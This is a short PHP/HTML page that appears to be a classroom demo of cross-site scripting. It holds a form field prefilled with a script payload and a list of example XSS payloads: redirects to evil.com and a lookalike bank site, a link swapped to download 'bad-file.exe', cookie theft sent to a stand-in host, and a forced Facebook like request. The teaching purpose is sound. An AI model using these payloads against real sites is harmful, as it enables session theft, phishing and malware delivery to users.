<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hi PHP</title>
	<link rel="stylesheet" href="assets/styles/main.css">
</head>

<body>
    <?php require_once('components/navigation.php'); ?>
    <h1>Hi PHP</h1>
   
   <?php
    $str = '<h2>Cross-Site Scripting (XSS) Attacks</h2>';
    echo $str;
    ?>

    <form action="login.php" method="get">
        <input name="nickname" type="text" value="nickname? <script>alert('Go Away') </script>" placeholder="XSS examples ↓" style="width:80%" />
        <button>Go</button>
    </form>
    
    <pre>
        &lt;script>alert('Go Away') &lt;/script>
        &lt;script>window.location="http://evil.com" &lt;/script>
        &lt;script>window.location="http://bankpokalim.com" &lt;/script>
        &lt;script>theLink.href="http://evil.com/bad-file.exe" &lt;/script>
        &lt;script>setTimeout(()=>{document.querySelector('#theLink').href="http://evil.com/bad-file.exe"}, 1000) &lt;/script>
        &lt;script>console.log('Cookies:', document.cookie) &lt;/script>
        &lt;script>setTimeout(()=>{imgEvil.src = 'http://evil.cox/api/steel?stolen=' + document.cookie}, 1000) &lt;/script>
        &lt;script> window.location = 'https://www.facebook.com/api/addLike?postId=17671'   &lt;/script>
    </pre>

    <button onclick="getCars()">get Cars</button>
    <div id="nested-car-list"></div>

    <script src="controller/main.controller.js"></script>
</body>

</html>